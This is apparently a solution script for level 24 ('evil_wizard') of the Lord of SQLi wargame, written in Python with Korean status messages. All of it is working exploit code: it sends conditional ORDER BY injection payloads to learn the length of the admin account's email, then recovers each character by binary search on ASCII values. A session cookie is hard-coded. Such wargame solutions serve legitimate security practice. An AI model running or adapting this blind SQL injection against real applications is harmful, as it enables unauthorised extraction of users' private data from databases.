import requests

def send(param):
    url = "https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php"
    cookie = "tp0ja8gkvp5j75fm5lntqomope"
    head = {"PHPSESSID":f"{cookie}"}
    my_url = url+param
    res = requests.get(my_url, cookies=head)
    return res.text

print("💘 LoS 24를 시작합니다")

for num in range(0,100):
    param=f"?order=if(id='admin' and length(email)={num}, '1 ASC', '1 DESC')"
    if("50</td></tr><tr><td>rubiya" in send(param)):
        print(f"👏 email의 길이는 {num}입니다!")
        break

ans=""

for len in range(1, num+1):
    start = 32
    end = 127
    while True:
        middle = round((start+end)/2)
        param=f"?order=if(id='admin' and ascii(substr(email,{len},1))>={middle}, '1 ASC', '1 DESC') %23"
        if("50</td></tr><tr><td>rubiya" in send(param)):
            param=f"?order=if(id='admin' and ascii(substr(email,{len},1))={middle}, '1 ASC', '1 DESC') %23"
            if("50</td></tr><tr><td>rubiya" in send(param)):
                print(f"{len}번째 문자 → {chr(middle)}")
                ans+=chr(middle)
                break
            else:
                start = middle
                continue
        else:
            end = middle
            continue

print(f"👏 email의 정체는 [{ans}]입니다!")
